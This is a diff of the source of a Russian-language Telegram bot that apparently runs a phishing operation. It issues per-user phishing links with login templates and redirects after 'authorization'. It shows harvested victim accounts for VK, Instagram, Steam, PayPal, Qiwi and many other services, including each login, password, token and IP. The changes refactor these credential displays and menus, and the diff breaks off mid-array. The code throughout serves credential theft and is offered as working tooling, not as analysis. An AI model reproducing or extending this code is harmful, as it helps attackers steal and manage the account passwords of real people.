@@ -5,44 +5,15 @@ const link = require('./database/models/link')
 const StringDate = require('./server/tools').GetStringDate
 const sendMessageWK = require('./server/tools').CreateNewMessageWithKeyboard
 const sendMessageWIK = require('./server/tools').CreateNewMessageWithInlineKeyboard
+const adminCommands = require('./adminCommands')()
+const {
+    names,
+    links,
+    emptyString,
+    ReplayListAccs,
+    ReplayListLinks
+} = require('./objects')
 
-const names = {
-    'vk': 'Вконтакте',
-    'inst': 'Instagram',
-    'ok': 'OK',
-    'fb': 'Facebook',
-    'tt': 'TikTok',
-    'st': 'Steam',
-    'wot': 'World of Tanks',
-    'mc': 'Minecraft',
-    'tg': 'Telegram',
-    'sc': 'SocialClub',
-    'sp': 'Samp',
-    'ft': 'Fortnite',
-    'ml': 'Mail',
-    'ya': 'Yandex',
-    'gl': 'Google',
-    'yh': 'Yahoo',
-    'tw': 'Twitter',
-    'ds': 'Discord',
-    'gj': 'Gaijin',
-    'ms': 'Microsoft',
-    'pr': 'Payeer',
-    'psn': 'PSN',
-    'pp': 'PayPal',
-    'rb': 'Roblox',
-    'az': 'Amazon',
-    'qw': 'Qiwi',
-    'wm': 'Webmoney',
-}
-const emptyString = '                                                                                           '
-
-const links = {
-    'vk': 'https://vk.com/',
-    'inst': 'https://www.instagram.com/',
-    'ok': 'https://ok.ru/profile/',
-    'fb': 'https://ru-ru.facebook.com/profile.php?id=',
-}
 async function ShowLinks(callbackQuery) {
     const links = await link.find({
         tg_id: callbackQuery.message.chat.id,
@@ -94,7 +65,6 @@ async function ShowLinkInfo(callbackQuery) {
         caption: `Шаблон #${c+1} [${links.query[c].name}]\n\n${links.query[c].description}\n\nВаша ссылка: <code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>\n\n\ Перед после успешной авторизации: <code>${links.query[c].redirect}</code>`,
         reply_markup: {
             inline_keyboard: [
-
                 links.query[c + 1] ? [{
                     text: '➡️',
                     callback_data: `showNextLinkQuery_${links._id}_${c}`
@@ -103,7 +73,7 @@ async function ShowLinkInfo(callbackQuery) {
             ]
         },
         parse_mode: 'HTML'
-    }).catch(err=>{
+    }).catch(err => {
         bot.sendMessage(msg.chat.id, '(Image Error)К сожалению у нас произошла ошибка, пожалуйста обратитесь к администратору')
     })
 }
@@ -179,10 +149,10 @@ async function showNextLink(callbackQuery) {
                     text: '⬅️',
                     callback_data: `showPrevLinkQuery_${links._id}_${c}`
                 }]),
-                [{
-                    text: 'Изменить ссылку после авторизации',
-                    callback_data: `changeUrl_${links._id}_${c}`
-                }]
+                // [{
+                //     text: 'Изменить ссылку после авторизации',
+                //     callback_data: `changeUrl_${links._id}_${c}`
+                // }]
             ]
         },
         parse_mode: 'HTML',
@@ -193,10 +163,11 @@ async function NextAccount(callbackQuery) {
         tg_id: callbackQuery.message.chat.id,
         type: callbackQuery.data.split('_')[1]
     })
+    accounts.reverse()
     let c = Number(callbackQuery.data.split('_')[2]) + 1
     if (accounts[c + 1]) {
         if (callbackQuery.data.split('_')[1] == 'vk') {
-            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: callbackQuery.message.message_id,
                 reply_markup: {
@@ -204,10 +175,6 @@ async function NextAccount(callbackQuery) {
                         [{
                                 text: '⬅️',
                                 callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                            },
-                            {
-                                text: 'Ссылка',
-                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                             },
                             {
                                 text: '➡️',
@@ -219,7 +186,7 @@ async function NextAccount(callbackQuery) {
                 parse_mode: 'HTML'
             })
         } else {
-            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: callbackQuery.message.message_id,
                 reply_markup: {
@@ -227,10 +194,6 @@ async function NextAccount(callbackQuery) {
                         [{
                                 text: '⬅️',
                                 callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                            },
-                            {
-                                text: 'Ссылка',
-                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                             },
                             {
                                 text: '➡️',
@@ -244,7 +207,7 @@ async function NextAccount(callbackQuery) {
         }
     } else {
         if (callbackQuery.data.split('_')[1] == 'vk') {
-            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: callbackQuery.message.message_id,
                 reply_markup: {
@@ -253,17 +216,13 @@ async function NextAccount(callbackQuery) {
                                 text: '⬅️',
                                 callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
                             },
-                            {
-                                text: 'Ссылка',
-                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
-                            }
                         ],
                     ]
                 },
                 parse_mode: 'HTML'
             })
         } else {
-            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: callbackQuery.message.message_id,
                 reply_markup: {
@@ -271,10 +230,6 @@ async function NextAccount(callbackQuery) {
                         [{
                                 text: '⬅️',
                                 callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                            },
-                            {
-                                text: 'Ссылка',
-                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                             }
                         ],
                     ]
@@ -290,10 +245,11 @@ async function PreviousAccount(callbackQuery) {
         tg_id: callbackQuery.message.chat.id,
         type: callbackQuery.data.split('_')[1]
     })
+    accounts.reverse()
     let c = Number(callbackQuery.data.split('_')[2]) - 1
     if (accounts[c - 1]) {
         if (callbackQuery.data.split('_')[1] == 'vk') {
-            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: callbackQuery.message.message_id,
                 reply_markup: {
@@ -301,10 +257,6 @@ async function PreviousAccount(callbackQuery) {
                         [{
                                 text: '⬅️',
                                 callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                            },
-                            {
-                                text: 'Ссылка',
-                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                             },
                             {
                                 text: '➡️',
@@ -316,7 +268,7 @@ async function PreviousAccount(callbackQuery) {
                 parse_mode: 'HTML'
             })
         } else {
-            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: callbackQuery.message.message_id,
                 reply_markup: {
@@ -324,10 +276,6 @@ async function PreviousAccount(callbackQuery) {
                         [{
                                 text: '⬅️',
                                 callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                            },
-                            {
-                                text: 'Ссылка',
-                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                             },
                             {
                                 text: '➡️',
@@ -341,15 +289,12 @@ async function PreviousAccount(callbackQuery) {
         }
     } else {
         if (callbackQuery.data.split('_')[1] == 'vk') {
-            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: callbackQuery.message.message_id,
                 reply_markup: {
                     inline_keyboard: [
-                        [{
-                                text: 'Ссылка',
-                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
-                            },
+                        [
                             {
                                 text: '➡️',
                                 callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
@@ -360,15 +305,12 @@ async function PreviousAccount(callbackQuery) {
                 parse_mode: 'HTML'
             })
         } else {
-            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                 chat_id: callbackQuery.message.chat.id,
                 message_id: callbackQuery.message.message_id,
                 reply_markup: {
                     inline_keyboard: [
-                        [{
-                                text: 'Ссылка',
-                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
-                            },
+                        [
                             {
                                 text: '➡️',
                                 callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
@@ -387,18 +329,16 @@ async function ShowAccounts(callbackQuery) {
         type: callbackQuery.data.split('_')[1]
     })
     let c = 0
+    accounts.reverse()
     if (accounts.length > 0) {
         if (accounts.length > 1) {
             if (callbackQuery.data.split('_')[1] == 'vk') {
-                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                     chat_id: callbackQuery.message.chat.id,
                     message_id: callbackQuery.message.message_id,
                     reply_markup: {
                         inline_keyboard: [
-                            [{
-                                    text: 'Ссылка',
-                                    url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
-                                },
+                            [
                                 {
                                     text: '➡️',
                                     callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
@@ -411,15 +351,12 @@ async function ShowAccounts(callbackQuery) {
                     console.log(err)
                 })
             } else {
-                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                     chat_id: callbackQuery.message.chat.id,
                     message_id: callbackQuery.message.message_id,
                     reply_markup: {
                         inline_keyboard: [
-                            [{
-                                    text: 'Ссылка',
-                                    url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
-                                },
+                            [
                                 {
                                     text: '➡️',
                                     callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
@@ -434,15 +371,12 @@ async function ShowAccounts(callbackQuery) {
             }
         } else {
             if (callbackQuery.data.split('_')[1] == 'vk') {
-                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                     chat_id: callbackQuery.message.chat.id,
                     message_id: callbackQuery.message.message_id,
                     reply_markup: {
                         inline_keyboard: [
-                            [{
-                                text: 'Ссылка',
-                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
-                            }],
+                            [],
                         ]
                     },
                     parse_mode: 'HTML'
@@ -450,15 +384,12 @@ async function ShowAccounts(callbackQuery) {
                     console.log('3')
                 })
             } else {
-                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
+                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${accounts[c].login}</code>\n🗝 Password: <code>${accounts[c].password}</code>\n\n📍 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
                     chat_id: callbackQuery.message.chat.id,
                     message_id: callbackQuery.message.message_id,
                     reply_markup: {
                         inline_keyboard: [
-                            [{
-                                text: 'Ссылка',
-                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
-                            }],
+                            [],
                         ]
                     },
                     parse_mode: 'HTML'
@@ -486,449 +417,7 @@ async function ShowAccounts(callbackQuery) {
         })
     }
 }
-async function ShowPrevAccsReplay(callbackQuery) {
-    const ReplayList = [
-        [{
-            text: 'Вконтакте',
-            callback_data: 'showAccs_vk'
-        }, {
-            text: 'Instagram',
-            callback_data: 'showAccs_inst'
-        }],
-        [{
-            text: 'Одноклассники',
-            callback_data: 'showAccs_ok'
-        }, {
-            text: 'Facebook',
-            callback_data: 'showAccs_fb'
-        }],
-        [{
-            text: 'TikTok',
-            callback_data: 'showAccs_tt'
-        }, {
-            text: 'Steam',
-            callback_data: 'showAccs_st'
-        }],
 
-        [{
-            text: 'World of Tanks',
-            callback_data: 'showAccs_wot'
-        }, {
-            text: 'Minecraft',
-            callback_data: 'showAccs_mc'
-        }],
-        [{
-            text: 'Telegram',
-            callback_data: 'showAccs_tg'
-        }, {
-            text: 'SocialClub',
-            callback_data: 'showAccs_sc'
-        }],
-        [{
-            text: 'Samp',
-            callback_data: 'showAccs_sp'
-        }, {
-            text: 'Fortnite',
-            callback_data: 'showAccs_ft'
-        }],
-        [{
-            text: 'Mail',
-            callback_data: 'showAccs_ml'
-        }, {
-            text: 'Yandex',
-            callback_data: 'showAccs_ya'
-        }],
-        [{
-            text: 'Google',
-            callback_data: 'showAccs_gl'
-        }, {
-            text: 'Yahoo',
-            callback_data: 'showAccs_yh'
-        }],
-        [{
-            text: 'Twitter',
-            callback_data: 'showAccs_tw'
-        }, {
-            text: 'Discord',
-            callback_data: 'showAccs_ds'
-        }],
-        [{
-            text: 'Gaijin',
-            callback_data: 'showAccs_gj'
-        }, {
-            text: 'Microsoft',
-            callback_data: 'showAccs_ms'
-        }],
-        [{
-            text: 'Payeer',
-            callback_data: 'showAccs_pr'
-        }, {
-            text: 'PSN',
-            callback_data: 'showAccs_psn'
-        }],
-        [{
-            text: 'PayPal',
-            callback_data: 'showAccs_pp'
-        }, {
-            text: 'PSN',
-            callback_data: 'showAccs_psn'
-        }],
-        [{
-            text: 'Roblox',
-            callback_data: 'showAccs_rb'
-        }, {
-            text: 'Amazon',
-            callback_data: 'showAccs_az'
-        }],
-        [{
-            text: 'Qiwi',
-            callback_data: 'showAccs_qw'
-        }, {
-            text: 'Webmoney',
-            callback_data: 'showAccs_wm'
-        }],
-    ]
-    let id = Number(callbackQuery.data.split('_')[1])
-    await bot.editMessageText(callbackQuery.message.text,
-        {chat_id: callbackQuery.message.chat.id,
-        message_id: callbackQuery.message.message_id,
-        reply_markup: {
-            inline_keyboard: [
-                ReplayList[id-3]? ReplayList[id-3]:[],
-                ReplayList[id-2]? ReplayList[id-2]:[],
-                ReplayList[id-1] ? ReplayList[id-1]:[],
-                ReplayList[id-4] ? [{text:'⬅️', callback_data: 'prevAccsReplay_'+Number(id-3)},{text:'➡️', callback_data: 'nextAccsReplay_'+Number(id)}] : [{text:'➡️', callback_data: 'nextAccsReplay_'+Number(id)}]
-            ]
-        }
-    }).catch(err => {})
-}
-async function ShowNextAccsReplay(callbackQuery) {
-    const ReplayList = [
-        [{
-            text: 'Вконтакте',
-            callback_data: 'showAccs_vk'
-        }, {
-            text: 'Instagram',
-            callback_data: 'showAccs_inst'
-        }],
-        [{
-            text: 'Одноклассники',
-            callback_data: 'showAccs_ok'
-        }, {
-            text: 'Facebook',
-            callback_data: 'showAccs_fb'
-        }],
-        [{
-            text: 'TikTok',
-            callback_data: 'showAccs_tt'
-        }, {
-            text: 'Steam',
-            callback_data: 'showAccs_st'
-        }],
-
-        [{
-            text: 'World of Tanks',
-            callback_data: 'showAccs_wot'
-        }, {
-            text: 'Minecraft',
-            callback_data: 'showAccs_mc'
-        }],
-        [{
-            text: 'Telegram',
-            callback_data: 'showAccs_tg'
-        }, {
-            text: 'SocialClub',
-            callback_data: 'showAccs_sc'
-        }],
-        [{
-            text: 'Samp',
-            callback_data: 'showAccs_sp'
-        }, {
-            text: 'Fortnite',
-            callback_data: 'showAccs_ft'
-        }],
-        [{
-            text: 'Mail',
-            callback_data: 'showAccs_ml'
-        }, {
-            text: 'Yandex',
-            callback_data: 'showAccs_ya'
-        }],
-        [{
-            text: 'Google',
-            callback_data: 'showAccs_gl'
-        }, {
-            text: 'Yahoo',
-            callback_data: 'showAccs_yh'
-        }],
-        [{
-            text: 'Twitter',
-            callback_data: 'showAccs_tw'
-        }, {
-            text: 'Discord',
-            callback_data: 'showAccs_ds'
-        }],
-        [{
-            text: 'Gaijin',
-            callback_data: 'showAccs_gj'
-        }, {
-            text: 'Microsoft',
-            callback_data: 'showAccs_ms'
-        }],
-        [{
-            text: 'Payeer',
-            callback_data: 'showAccs_pr'
-        }, {
-            text: 'PayPal',
-            callback_data: 'showAccs_pp'
-        }],
-        [{
-            text: 'Roblox',
-            callback_data: 'showAccs_rb'
-        }, {
-            text: 'Amazon',
-            callback_data: 'showAccs_az'
-        }],
-        [{
-            text: 'Qiwi',
-            callback_data: 'showAccs_qw'
-        }, {
-            text: 'Webmoney',
-            callback_data: 'showAccs_wm'
-        }],
-    ]
-    let id = Number(callbackQuery.data.split('_')[1])
-    await bot.editMessageText(callbackQuery.message.text,
-        {chat_id: callbackQuery.message.chat.id,
-        message_id: callbackQuery.message.message_id,
-        reply_markup: {
-            inline_keyboard: [
-                ReplayList[id]?ReplayList[id]:[],
-                ReplayList[id+1]?ReplayList[id+1]:[],
-                ReplayList[id+2] ? ReplayList[id+2]:[],
-                ReplayList[id+3] ? [{text:'⬅️', callback_data: 'prevAccsReplay_'+id},{text:'➡️', callback_data: 'nextAccsReplay_'+Number(id+3)}] : [{text:'⬅️', callback_data: 'prevAccsReplay_'+id}]
-            ]
-        }
-    }).catch(err => {})
-}
-async function ShowPrevLinksReplay(callbackQuery) {
-    const ReplayList = [
-        [{
-            text: 'Вконтакте',
-            callback_data: 'showLinks_vk'
-        }, {
-            text: 'Instagram',
-            callback_data: 'showLinks_inst'
-        }],
-        [{
-            text: 'Одноклассники',
-            callback_data: 'showLinks_ok'
-        }, {
-            text: 'Facebook',
-            callback_data: 'showLinks_fb'
-        }],
-        [{
-            text: 'TikTok',
